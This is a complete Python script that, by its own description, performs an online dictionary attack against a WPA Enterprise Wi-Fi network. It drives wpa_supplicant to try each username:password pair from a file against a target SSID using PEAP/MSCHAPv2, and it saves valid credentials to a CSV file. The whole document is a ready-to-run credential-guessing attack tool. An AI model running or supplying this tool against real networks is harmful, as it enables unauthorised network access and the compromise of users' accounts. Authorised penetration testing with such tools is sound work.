#!/usr/bin/env python3

import argparse
import datetime
import time
import sys

from wpa_supplicant.core import WpaSupplicantDriver
from twisted.internet.selectreactor import SelectReactor
import threading

def timestamp():
    now = datetime.datetime.now()
    timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
    return timestamp

def connect_to_wifi(ssid, username, password, interface, supplicant, outfile=None, authentication="wpa-enterprise"):
    valid_credentials_found = False

    print("Trying %s:%s..." % (username, password))

    # WPA Enterprise configuration
    if authentication == "wpa-enterprise":
        network_params = {
            "ssid": ssid,
            "key_mgmt": "WPA-EAP",
            "eap": "PEAP",
            'identity': username,
            'password': password,
            "phase2": "auth=MSCHAPV2",
        }

    # Remove all the networks currently assigned to this interface
    for network in interface.get_networks():
        network_path = network.get_path()
        interface.remove_network(network_path)

    # Add the target network to the interface and connect to it
    interface.add_network(network_params)
    target_network = interface.get_networks()[0].get_path()

    interface.select_network(target_network)

    # Check the status of the wireless connection
    credentials_valid = 0
    max_wait = 4.5
    # How often, in seconds, the loop checks for successful authentication
    test_interval = 0.01
    seconds_passed = 0
    while seconds_passed <= max_wait:
        try:
            state = interface.get_state()
            if state == "completed":
                credentials_valid = 1
                break
        except Exception as e:
            print(e)
            break

        time.sleep(test_interval)
        seconds_passed += test_interval

    if credentials_valid == 1:
        print("[!] VALID CREDENTIALS: %s:%s" % (username, password))
        if outfile:
            with open(outfile, 'a') as f:
                csv_output = "\"%(timestamp)s\",\"%(ssid)s\",\"%(username)s\",\"%(password)s\"\n" % {
                    "timestamp": timestamp(),
                    "ssid": ssid,
                    "username": username,
                    "password": password,
                }
                f.write(csv_output)

        valid_credentials_found = True

    # Disconnect from the network
    try:
        interface.disconnect_network()
    except:
        pass

    try:
        interface.remove_network(target_network)
    except:
        pass

    return valid_credentials_found

# Handle command-line arguments and generate usage text.
description = "Perform an online, horizontal dictionary attack against a WPA Enterprise network."

parser = argparse.ArgumentParser(
    description=description, add_help=False,
    formatter_class=argparse.ArgumentDefaultsHelpFormatter
)
parser.add_argument('-i', type=str, required=True, metavar='interface',
                    dest='device', help='Wireless interface')
parser.add_argument('-e', type=str, required=True,
                    dest='ssid', help='SSID of the target network')
parser.add_argument('-f', type=str, required=True, dest='userpassfile',
                    help='File containing username:password combinations')
parser.add_argument('-w', type=str, default=None, dest='outfile',
                    help='Save valid credentials to a CSV file')
parser.add_argument('-1', default=False, dest='stop_on_success',
                    action='store_true',
                    help='Stop after the first set of valid credentials is found')
parser.add_argument('-t', default=0.5, metavar='seconds', type=float,
                    dest='attempt_delay',
                    help='Seconds to sleep between each connection attempt')

# Workaround to make help display without adding "-h" to the usage line
if "-h" in sys.argv or "--help" in sys.argv or len(sys.argv) == 1:
    parser.print_help()
    sys.exit()
args = parser.parse_args()

device = args.device
ssid = args.ssid
userpassfile = args.userpassfile
outfile = args.outfile
stop_on_success = args.stop_on_success
attempt_delay = args.attempt_delay

# Read username:password combinations into an array
userpass_list = []
with open(userpassfile, 'r') as f:
    for line in f:
        username, password = line.strip().split(':')
        userpass_list.append((username, password))

# Start a simple Twisted SelectReactor
reactor = SelectReactor()
threading.Thread(target=reactor.run, kwargs={'installSignalHandlers': 0}).start()
time.sleep(0.1)  # let reactor start

# Start Driver
driver = WpaSupplicantDriver(reactor)

# Connect to the supplicant, which returns the "root" D-Bus object for wpa_supplicant
supplicant = driver.connect()

# Register an interface with the supplicant, this can raise an error if the supplicant
# already knows about this interface
try:
    interface = supplicant.get_interface(device)
except:
    interface = supplicant.create_interface(device)

try:
    for username, password in userpass_list:
        print("Trying %s:%s..." % (username, password), end="")
        valid_credentials_found = connect_to_wifi(ssid=ssid,
                                                  username=username,
                                                  password=password,
                                                  interface=interface,
                                                  supplicant=supplicant,
                                                  outfile=outfile)
        if (valid_credentials_found and stop_on_success):
            break

        time.sleep(attempt_delay)

    if reactor.running == True:
        reactor.sigBreak()

    print("DONE!")
except KeyboardInterrupt:
    # Stop the running reactor so the program can exit
    if reactor.running == True:
        reactor.sigBreak()
    print("Attack stopped by the user.")
except Exception as e:
    print(e)
    if reactor.running == True:
        reactor.sigBreak()
